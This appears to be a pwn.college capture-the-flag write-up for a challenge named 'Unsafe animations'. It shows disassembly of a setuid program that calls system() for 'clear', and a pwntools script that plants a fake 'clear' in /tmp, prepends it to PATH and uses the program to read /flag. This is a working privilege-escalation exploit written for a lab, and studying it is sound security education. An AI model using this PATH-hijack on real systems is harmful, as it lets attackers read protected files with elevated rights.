# Unsafe animations

#### This challenge adds two new handles. Handle_6 is a clear and handle_7 is a sleep function, both for animations. The most important thing is in handle_6, it system calls and interacts with permissions:
```asm
0x0000000000401ff3 <+56>:    call   0x401230 <geteuid@plt>
0x0000000000401ff8 <+61>:    mov    %eax,%edi
0x0000000000401ffa <+63>:    call   0x4012e0 <setuid@plt>
0x0000000000401fff <+68>:    lea    0x1272(%rip),%rdi        # 0x403278
0x0000000000402006 <+75>:    call   0x4011f0 <system@plt>
```
------------------------------

#### If you try and use the same attack as last challenge you're greeted with an error. Instead its about creating a link to the flag file and setting its PATH.
```python
from pwn import *
import re
import struct
import os

context.log_level = 'error'
def gen_flag():
    header = b'cIMG' + struct.pack('<HBBI', 4, 1, 1, 1)
    directive = struct.pack('<H', 6)
    cimg = header + directive + b'\x00'

    with open('s.cimg', 'wb') as f:
        f.write(cimg)
        
    io = process('/bin/sh')
    io.sendline(b'echo -e \'#!/bin/sh\\ncat /flag\' > /tmp/clear')
    io.sendline(b'chmod +x /tmp/clear')
    io.sendline(b'export PATH=/tmp:$PATH')
    io.sendline(b'/challenge/cimg s.cimg') 
    out = io.recvall(timeout=1)
    flag = flag = re.search(rb'pwn\.college\{.*?\}', out).group()
    print(flag)

if __name__ == '__main__':
    gen_flag()
```
